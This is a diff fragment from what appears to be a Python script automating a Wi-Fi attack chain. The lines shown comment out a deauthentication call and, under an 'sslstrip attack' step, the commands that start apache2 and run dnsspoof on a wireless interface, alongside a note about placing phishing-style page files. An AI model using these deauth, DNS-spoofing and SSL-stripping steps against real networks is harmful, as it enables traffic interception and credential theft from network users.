@@ -62,8 +62,8 @@ if __name__ == '__main__':
     # os.system("python3 my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
 
     ##------------------------ step 7 sslstrip attack ----------------------------------------##
-    os.system("service apache2 start")
-    os.system("dnsspoof -i wlan2 -f dnsspoof")
+    # os.system("service apache2 start")
+    # os.system("dnsspoof -i wlan2 -f dnsspoof")
 
     #move get.php and index.html to the comp folder##########
     while True:
